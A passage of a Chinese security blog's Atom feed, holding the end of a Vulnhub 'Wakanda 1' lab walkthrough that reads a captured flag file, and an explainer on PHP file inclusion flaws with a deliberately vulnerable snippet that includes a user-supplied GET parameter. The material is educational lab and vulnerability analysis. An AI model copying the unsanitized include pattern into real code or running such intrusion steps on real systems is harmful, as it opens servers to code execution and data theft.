class="line">ls</span><br><span class="line">flag2.txt</span><br><span class="line">devops@Wakanda1:~$ cat flag2.txt</span><br><span class="line">cat flag2.txt</span><br><span class="line">Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098</span><br></pre></td></tr></tbody></table></figure><p>未完待续…</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;靶机地址：&lt;a href=&quot;https://www.vulnhub.com/entry/wakanda-1,251/#&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/wakanda-1,251/#&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用VM VirtualBox运行靶机，配置运行kali的VMware和运行靶机的VM VirtualBox均使用桥接网卡模式，这样kali和目的靶机就在同一个局域网中，可以开始后续的测试了。&lt;/p&gt;
&lt;h2 id=&quot;0x01-目标探测&quot;&gt;&lt;a href=&quot;#0x01-目标探测&quot; class=&quot;headerlink&quot; title=&quot;0x01 目标探测&quot;&gt;&lt;/a&gt;0x01 目标探测&lt;/h2&gt;&lt;p&gt;我们先使用&lt;code&gt;ipconfig&lt;/code&gt;命令来查看下本地ip，然后再使用&lt;code&gt;netdiscover&lt;/code&gt;命令和&lt;code&gt;arp -l&lt;/code&gt;命令来探测局域网内有哪些存活的主机。&lt;/p&gt;
    
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/categories/Web/"/>
    
    
      <category term="Vulnhub" scheme="http://yoursite.com/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞分析</title>
    <link href="http://yoursite.com/2019/07/17/LFI/"/>
    <id>http://yoursite.com/2019/07/17/LFI/</id>
    <published>2019-07-17T12:36:57.641Z</published>
    <updated>2020-06-16T17:01:27.138Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>如果允许客户端输入控制动态包含在服务器端的文件，会导致恶意代码的执行与敏感信息的泄露。文件包含通常分为本地文件包含（<code>Local File Inclusion</code>）和远程文件包含(<code>Remote File Inclusion</code>)。<code>allow_url_fopen</code>和<code>allow_url_include</code>为on的情况认为是远程文件包含漏洞，<code>allow_url_fopen</code>为off和<code>allow_url_include</code>为on为本地文件包含漏洞。</p><a id="more"></a><h2 id="0x01-漏洞成因"><a href="#0x01-漏洞成因" class="headerlink" title="0x01 漏洞成因"></a>0x01 漏洞成因</h2><p>文件包含漏洞的产生原因是通过引入文件时，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意代码注入。当被包含的文件在服务器本地时，就形成本地文件包含漏洞。</p><h2 id="0x02-实例分析"><a href="#0x02-实例分析" class="headerlink" title="0x02 实例分析"></a>0x02 实例分析</h2><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'func'</span>]) {</span><br><span class="line">   <span class="keyword">include</span> $_GET[<span class="string">'func'</span>];</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">   <span class="keyword">include</span> <span class="string">'default.php'</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>程序的本意可能是当提交url为<code>http://example.com/index.php?func=add.php</code>时，调用add.php里面的样式内容和功能。直接访问<code>http://example.com/index.php</code>则会包含默认的default.php。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-漏洞简介&quot;&gt;&lt;a href=&quot;#0x00-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简介&quot;&gt;&lt;/a&gt;0x00 漏洞简介&lt;/h2&gt;&lt;p&gt;如果允许客户端输入控制动态包含在服务器端的文件，会导致恶意代码的执行与敏感信息的泄露。文件包含通常分为本地文件包含（&lt;code&gt;Local File Inclusion&lt;/code&gt;）和远程文件包含(&lt;code&gt;Remote File Inclusion&lt;/code&gt;)。&lt;code&gt;allow_url_fopen&lt;/code&gt;和&lt;code&gt;allow_url_include&lt;/code&gt;为on的情况认为是远程文件包含漏洞，&lt;code&gt;allow_url_fopen&lt;/code&gt;为off和&lt;code&gt;allow_url_include&lt;/code&gt;为on为本地文件包含漏洞。&lt;/p&gt;
    
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/categories/Web/"/>
    
    
      <category term="文件包含" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
</feed>
